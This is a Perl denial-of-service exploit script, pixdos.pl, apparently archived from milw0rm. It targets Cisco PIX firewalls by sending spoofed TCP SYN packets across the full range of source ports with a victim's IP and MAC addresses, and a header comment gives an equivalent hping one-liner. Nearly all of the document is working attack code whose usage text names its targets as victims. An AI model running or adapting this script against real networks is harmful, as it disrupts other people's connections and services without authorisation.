# The easy way by logic logidev@gmail.com (line 2) untested /str0ke
# hping -c 1 -S -s 31337 -k -b -p 22 10.0.xx.xxx

#!/usr/bin/perl
eval ("use Getopt::Long;");die "[error] Getopt::Long perl module is not installed \n" if $@;
eval ("use Net::RawIP;");die "[error] Net::RawIP perl module is not installed \n" if $@;
eval ("use Term::ProgressBar;");
die "[error] Term::ProgressBar perl module is not installed \n" if $@;
my $VERSION = "0.1";
print "$0, $PgmName, V $VERSION \n";
GetOptions ( 
"help" =>\$usage,
"device=s" => \$device, 
"source=s" =>\$sourceip,
"dest=s"=>\$destip,
"sourcemac=s"=>\$sourcemac,
"destmac=s"=>\$destmac,
"port=n"=> \$tcpport,
);

######################## Config option ####################

my $timeout = "0,1"; # Timeout

if ($usage) {&usage;} 

if (!$device) {
$device= 'eth0'; # Network device
}

if (!$destmac) {print "Dest MAC not found \n"; &usage;}
if (!$sourceip) {print "Source IP not found \n"; &usage;}
if (!$destip) {print "Dest IP not found \n"; &usage;}
if (!$tcpport) {print "TCP port not found \n"; &usage;}

my $syn="1"; # TCP SYN SET
my $tcpdata = "TEST"; # TCP payload
my $count=0;

######################################################

#Initialize Progres Bar 
my $progress = Term::ProgressBar->new(32768);
$progress->minor(0);
$packet = new Net::RawIP;
$packet-> ethnew($device);


if (!$sourcemac) {
$packet -> ethset( dest => $destmac);
}else { 
$packet -> ethset( source =>$sourcemac, dest => $destmac);
}



for ($count=0; $count< 65537 ; $count++) {

$packet->set({

ip => {
saddr => $sourceip,
daddr => $destip 
},

tcp => {
check => 0x0010 , # TCP Packet Checksum 0 for auto correct
source => $count,
dest => $tcpport,
syn => $syn,
data => $tcpdata
}});
$packet->ethsend($timeout);
#$packet->send($timeout);

$progress->update($_);
$count++;
}

sub usage {
print <<EOF ;
This program was originally written in the due course of writing
"Hacking Exposed Cisco Networks: Cisco Security Secrets and Solutions" book.
Tool author - Janis Vizulis, Arhont Ltd. (License GPL-2 ) Please send bugs 
and comments to info@arhont.com 

usage: $0 [ --device=interface ] [--source=IP] [--dest=IP] [--sourcemac=MAC]
[--destmac=MAC] [--port=n]

Options:

--help This message
--device Network interface (defaut set eth0)
--source Victim source IP
--dest Victim destination IP
--sourcemac Victim source MAC
--destmac MAC Address of the gateway
--port TCP port 

Example: ./pixdos.pl --device eth0 --source 192.168.44.10 --dest 192.168.55.111 \
--sourcemac 00:90:27:99:11:b6 --destmac 00:60:27:99:11:b6 --port 22 
EOF

exit shift;
}

# milw0rm.com [2005-11-23]
